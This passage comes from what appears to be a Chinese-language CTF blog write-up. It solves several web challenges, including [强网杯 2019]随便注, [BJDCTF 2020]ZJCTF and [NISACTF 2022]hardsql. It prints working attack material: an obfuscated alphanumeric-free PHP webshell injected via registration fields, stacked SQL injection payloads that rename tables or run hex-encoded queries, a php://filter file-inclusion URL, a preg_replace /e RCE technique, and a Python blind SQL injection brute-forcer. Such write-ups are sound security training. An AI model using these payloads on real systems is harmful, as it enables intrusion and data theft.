<span class="title">me</span> <span class="title">Signed</span> <span class="title">in</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#<span class="title">forgot</span>&quot;&gt;<span class="title">Forgot</span> <span class="title">Password</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt; --&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">sign</span>-<span class="title">up</span>-<span class="title">htm</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">user</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">pass</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot; <span class="title">data</span>-<span class="title">type</span>=&quot;<span class="title">password</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Website</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">website</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pass</span>&quot; <span class="title">class</span>=&quot;<span class="title">label</span>&quot;&gt;<span class="title">Your</span> <span class="title">Punctuation</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">pass</span>&quot; <span class="title">name</span>=&quot;<span class="title">punctuation</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">Up</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">hr</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">foot</span>-<span class="title">lnk</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">tab</span>-1&quot;&gt;<span class="title">Already</span> <span class="title">Member</span>?&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>审计上方代码发现存在file_put_contents，可以对php文件写入一句话木马。</p><p>有四个选择，选哪个好呢？接下来我们看看template.html，并找到关键代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        &lt;li&gt;&lt;span class=&quot;adminImg&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$user = ((string)__USER__);</span><br><span class="line">$pass = ((string)__PASS__);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user &amp;&amp; $_COOKIE[&#x27;pass&#x27;] === $pass)&#123;</span><br><span class="line">echo($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">      &lt;ul class=&quot;item&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;sitting_btn&quot;&gt;&lt;/span&gt;系统设置&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;help_btn&quot;&gt;&lt;/span&gt;使用指南 &lt;b&gt;&lt;/b&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;about_btn&quot;&gt;&lt;/span&gt;关于我们&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;span class=&quot;logout_btn&quot;&gt;&lt;/span&gt;退出系统&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; class=&quot;powered_by&quot;&gt;__PUNC__&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>只有__PUNC__是最好利用的，但是问号被过滤了，想要让它解析php，这时就需要它在上面的php里面，但是上面的php被闭合过了，但是我们又发现其实__USER__，__PASS__这些都是可控的，我们可以使用多行注释来解决问题。最后再把后面的注释掉就行，不然标签闭合会出现问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注册时用户名为a/*</span><br><span class="line">密码为a</span><br><span class="line">website为a</span><br><span class="line">描述为*/);$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);/*</span><br><span class="line">即可，无数字字母rce，简单的很</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png" alt="image-20241129185322665"></p><p>查看网页源代码即可获取flag</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>sql注入题</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png" alt="image-20241201081543495"></p><p>存在过滤，不好直接联合注入啊</p><p>试试堆叠</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png" alt="image-20241201081821727" style="zoom:67%;" /><p>存在堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png" alt="image-20241201081952743" style="zoom:67%;" /><p>但是这里select等被过滤了，该怎么办呢？</p><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><blockquote><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png" alt="image-20241201082223713"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;64bfe910-ba05-4133-8fdf-11bdf68fd5ce&#125;</span><br></pre></td></tr></table></figure><p>以上为第一种方法</p><p>还有两种思路！！！</p><p><strong>方法一：</strong></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png" alt="image-20241201082453677" style="zoom:67%;" /><p>直接查1，搜到的是words表的相关内容，而搜不到flag表的相关内容，那么我们可不可以把flag表变成words表呢，那不就可以直接搜到flag表的内容了吗？！</p><blockquote><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png" alt="image-20241201082658543"></p><p><strong>方法二：</strong></p><blockquote><p>因为select被过滤了，所以先将select * from <code>1919810931114514</code>进行16进制编码</p><p>再通过构造payload得</p><p>1’;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p><p>进而得到flag</p></blockquote><p>prepare…from…是预处理语句，会进行编码转换。</p><p>execute用来执行由SQLPrepare创建的SQL语句。</p><p>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</p><h2 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28418/?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来试了一下filterchain，可以用是可以用但是flag出不来，可能被特意设计了</p><p>这里主要涉及到<code>preg_replace</code>的一个RCE漏洞，参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>主要就是构造<code>preg_replace(&#39;.*&#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, &#123;$&#123;此处填函数名&#125;&#125;);</code><br> 大概就是把所有字符替换为函数执行结果。<br> 但是GET传<code>.*=xxx</code>会出问题，自动将第一个非法字符转化为下划线（看链接），所以构造：</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png" alt="image-20241201090321285" style="zoom: 67%;" /><p>这里没有出flag，那就是环境问题了，之前的filterchain应该也是可以的！！</p><h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=_POST[‘passwd’];</span><br><span class="line">sql=&quot;SELECT passwd FROM users WHERE username=′bilala′ and passwd=′password’;&quot;;</span><br></pre></td></tr></table></figure><p>根据题目描述，username为bilala，password处存在注入点，可以进行sql注入测试。</p><p>先fuzz一下，存在waf</p><p>发现like和百分号没有被过滤，直接爆破密码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node5.anna.nssctf.cn:23092/login.php&#x27;</span></span><br><span class="line">str_sum=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_sum:</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bilala&quot;</span>,<span class="string">&quot;passwd&quot;</span>:<span class="string">f&quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;<span class="subst">&#123;flag+j&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">        res=requests.post(url,data)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;nothing&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure><p>登陆成功后源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//多加了亿点点过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在此处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span 